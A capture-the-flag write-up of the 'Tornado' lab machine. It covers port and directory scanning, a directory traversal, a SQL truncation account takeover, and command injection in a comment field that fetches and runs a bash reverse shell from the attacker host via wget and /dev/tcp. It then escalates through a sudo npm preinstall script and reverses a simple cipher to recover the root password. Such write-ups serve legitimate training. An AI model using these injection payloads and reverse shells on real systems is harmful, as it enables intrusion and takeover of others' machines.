## Information Gathering
### Host Discovery

The following ARP scan discovered the target server.

```console
root@kali:/tornado# arp-scan -I vmnet1 172.16.71.1/24 
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 172.16.71.1
WARNING: host part of 172.16.71.1/24 is non-zero
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.71.129   08:00:27:24:df:03   PCS Systemtechnik GmbH
172.16.71.254   00:50:56:e8:25:3a   VMware, Inc.
```

### Port Scanning

The full TCP port scan with nmap found two open ports.

```console
root@kali:/tornado# nmap -n -v -p1-65535 --min-rate=300 172.16.71.129 -oG nmap/port-scan.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service Enumeration

The version enumeration and script scanning revealed a Debian operating system whith Apache/2.4.38 and SSH 7.9p1 installed.

```console
root@kali:/tornado# nmap -n -v -p22,80 -sCV -Pn 172.16.71.129 -oN nmap/service-enum.txt
...

## Enumeration
### Web Enumeration

Checking the website revealed nothing interesting.

![](/assets/images/tornado/screenshot-1.png)

Brute forcing web resources was discovered the **bluesky/** directory.

```bash
root@kali:/tornado# wfuzz -c --hc 403,404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.71.129/FUZZ 2>/dev/null
...
000089723:   301        9 L      28 W       316 Ch      "bluesky" 
...
```

BlueSky webpage.

![](/assets/images/tornado/screenshot-2.png)

A **signup.php** file was found by brute force in the **bluesky/** directory.

```console
root@kali:/tornado# echo -n "php\nhtml\ntxt\nsql" > extentions.txt 
root@kali:/tornado# wfuzz -c --hc 403,404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,extentions.txt -u http://172.16.71.129/bluesky/FUZZ.FUZ2Z 2>/dev/null

Register a test user, which I named admin as username and password.

![](/assets/images/tornado/screenshot-3.png)

![](/assets/images/tornado/screenshot-4.png)

Sign in to the web application.

![](/assets/images/tornado/screenshot-5.png)

![](/assets/images/tornado/screenshot-6.png)

In the **PORTFOLIO** menu source code, the following comment reveals the existence of the **/home/tornado/imp.txt** file.

![](/assets/images/tornado/screenshot-7.png)

Browsing the **CONTACT** menu, a pop-up reports about a vulnerability that in the comment feature has been turned off.

## Exploitation
### Directory traversal 

After a lot of time stuck trying to test for common file inclusion whitout successful results, the following uncommon path traversal worked **../../../~tornado/imp.txt**. This behavior is due to an alias set in the apache configuration file.

![](/assets/images/tornado/screenshot-9.png)

Download the **imp.txt** file to the attacker machine.


```console
root@kali:/tornado# wget -nv "http://172.16.71.129/bluesky/port.php../../../~tornado/imp.txt"
2023-09-12 19:16:38 URL:http://172.16.71.129/~tornado/imp.txt [116/116] -> "imp.txt" [1]
```

### SQL Truncation Attack

SQL Truncation is a flaw in the database configuration in which a user input is truncated (deleted) due to a restriction on the length. This vulnerability usually exists in MySQL databases that has the strict mode disabled.

[Here](https://linuxhint.com/sql-truncation-attack/) a reference about this security flaw.

In the signup feature note that is possible to register users with a length of 13 characters. The idea is to verify if any of the discovered users are registered.

![](/assets/images/tornado/screenshot-10.png)

Intercept the signup request.

![](/assets/images/tornado/screenshot-11.png)

In the intruder, select and add the **uname** value as value to test.

![](/assets/images/tornado/screenshot-12.png)

In Payloads tab, paste the discovered user emails.

![](/assets/images/tornado/screenshot-13.png)

In **Settings** tab, in **Grep - Extract** click **add**, select as base line **User already registered**, click **OK**.

![](/assets/images/tornado/screenshot-14.png)

Next, click **Start Attack**, in the following screenshot you can identify the registered users.

![](/assets/images/tornado/screenshot-15.png)

I tried with the other users, but the way to gain remote command execution was through the **jacob's** account.

Intercept the signup request, type **jacob@tornado** followed by three spaces and a letter after.

![](/assets/images/tornado/screenshot-16.png)

The user was registered successfully.

![](/assets/images/tornado/screenshot-17.png)

Sign in as username **jacob@tornado** and password **123**.

![](/assets/images/tornado/screenshot-18.png)

The access was successful, bypassing the login structure.

![](/assets/images/tornado/screenshot-19.png)

In **CONTACT** menu there is a feature to post comments.

### Command execution

To check for command execution vulnerability. Set a netcat listener and in the input form type the following:

`hi; whoami | nc 172.16.71.1 443`

![](/assets/images/tornado/screenshot-21.png)

We receive the result of the whoami command via netcat.

```console
root@kali:/tornado# nc -vlnp 443
listening on [any] 443 ...
connect to [172.16.71.1] from (UNKNOWN) [172.16.71.129] 39534
www-data
```

Write a bash reverse shell in a file, which I named rshell.

```console
root@kali:/tornado# echo "bash -c 'bash -i >& /dev/tcp/172.16.71.1/443 0>&1'" > rshell   
```

Set a web server with python.

```console
root@kali:/tornado# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Type the following in the comment field:

`hi;wget 172.16.71.1/rshell -O- |sh`

![](/assets/images/tornado/screenshot-22.png)

The above command download the bash reverse shell and it is interpreted directly in memory.

Then, upgrade to a full tty shell

```console
root@kali:/tornado# nc -vlnp 443
listening on [any] 443 ...
connect to [172.16.71.1] from (UNKNOWN) [172.16.71.129] 39538
bash: cannot set terminal process group (533): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tornado:/var/www/html/bluesky$ python3 -c "import pty; pty.spawn('/bin/bash')"
<ky$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@tornado:/var/www/html/bluesky$  ^Z       
zsh: suspended  nc -vlnp 443
root@kali:/tornado# stty raw -echo;fg
[1]  + continued  nc -vlnp 443

www-data@tornado:/var/www/html/bluesky$ export TERM=screen
www-data@tornado:/var/www/html/bluesky$ 
```

## Privilege Escalation
### Sudo Permissions

With sudo is possible to run the **npm** program as user catchme without password. NPM is a package manager for Node.js packages.

```console
www-data@tornado:/var/www/html/bluesky$ sudo -l
Matching Defaults entries for www-data on tornado:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on tornado:
    (catchme) NOPASSWD: /usr/bin/npm
```

Create the **package.json** file in a directory for a new node project. Any package installed in the project will be reflected in this file.

```bash
www-data@tornado:/dev/shm$ mkdir app
www-data@tornado:/dev/shm$ cat app/package.json 
{
  "name": "catchme",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
```

Additionally, the **package.json** file can be created with the **npm init** command, and doing it small changes to the file.

Run the following command to get a shell as **catchme** user.

```bash
www-data@tornado:/dev/shm$ sudo -u catchme npm i app/ --unsafe
npm WARN npm npm does not support Node.js v10.21.0
npm WARN npm You should probably upgrade to a newer version of node as we
npm WARN npm can't make any promises that npm will work with this version.
npm WARN npm Supported releases of Node.js are the latest release of 4, 6, 7, 8, 9.
npm WARN npm You can find the latest version at https://nodejs.org/

> catchme@1.0.0 preinstall /dev/shm/node_modules/catchme
> /bin/bash

catchme@tornado:/dev/shm/app$ whoami
catchme
catchme@tornado:/dev/shm/app$ 
```

In the **catchme** home directory there is a python script, probably a path to root.

```console
catchme@tornado:~$ ls
enc.py  user.txt
catchme@tornado:~$ cat user.txt 
HMVkeyedcaesar
```

### Decrypting Disclosed Password

Listing the content of enc.py script.

```python
s = "abcdefghijklmnopqrstuvwxyz"
shift=0
encrypted="hcjqnnsotrrwnqc"
#
k = input("Input a single word key :")
if len(k) > 1:
    print("Something bad happened!")
    exit(-1)

i = ord(k)
s = s.replace(k, '')
s = k + s
t = input("Enter the string to Encrypt here:")
li = len(t)
print("Encrypted message is:", end="")
while li != 0:
    for n in t:
        j = ord(n)
        if j == ord('a'):
            j = i
            print(chr(j), end="")
            li = li - 1

        elif n > 'a' and n <= k:
            j = j - 1
            print(chr(j), end="")
            li = li - 1

        elif n > k:
            print(n, end="")
            li = li - 1

        elif ord(n) == 32:
            print(chr(32), end="")
            li = li - 1

        elif j >= 48 and j <= 57:
            print(chr(j), end="")
            li = li - 1

        elif j >= 33 and j <= 47:
            print(chr(j), end="")
            li = li - 1

        elif j >= 58 and j <= 64:
            print(chr(j), end="")
            li = li - 1

        elif j >= 91 and j <= 96:
            print(chr(j), end="")
            li = li - 1

        elif j >= 123 and j <= 126:
            print(chr(j), end="")
            li = li - 1
```

This python code encrypts a user input using a set of visibly revertable procedures, also contains an encrypted string.

To reverse the encrypted string there is to understand the encryption method. Below is the explanation:

1. To encrypt a string it takes a sigle character as reference/key.

2. When a letter "a" is in the string, that value is equal to the key character.

3. If the value in the string is greater than "a" and less than or equal to the key character, the result is the value in the string minus 1.

4. If the value in the string is greater than the key value, the value in the string doesn't change.

5. If the value in the string is a special character, the value in the string doesn't change.

To obtain the result of the initial string, there is to do the reverse process of the previous explanation, taking all the letters of the alphabet as reference/key.

```python
#!/usr/bin/env python3

s = "abcdefghijklmnopqrstuvwxyz"

t = "hcjqnnsotrrwnqc"

for k in s:
    i = ord(k)
    print(f"{k}", end=" => ")
    for n in t:
        j = ord(n)
        
        if j == ord('a'):
            j = i
            print(chr(j), end="")

        elif n > 'a' and n <= k:
            j = j + 1
            print(chr(j), end="")

        elif n > k:
            print(n, end="")

        elif ord(n) == 32:
            print(chr(32), end="")

        elif j >= 48 and j <= 57:
            print(chr(j), end="")

        elif j >= 33 and j <= 47:
            print(chr(j), end="")

        elif j >= 58 and j <= 64:
            print(chr(j), end="")

        elif j >= 91 and j <= 96:
            print(chr(j), end="")

        elif j >= 123 and j <= 126:
            print(chr(j), end="")

    print("")
```

Run the script. There are 26 possible passwords, when the "s" letter is used as reference/key, a potential password is revealed.

```bash
root@kali:~/tornado/scripts# python3 dec.py 
...
s => idkrootptssword
...
```

Change **idkrootptssword** to **idkrootpassword**, and switch to the root user using the modified password.

```bash
catchme@tornado:~$ su -
Password: 
root@tornado:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tornado:~# cat root.txt 
HMVgoodwork
```
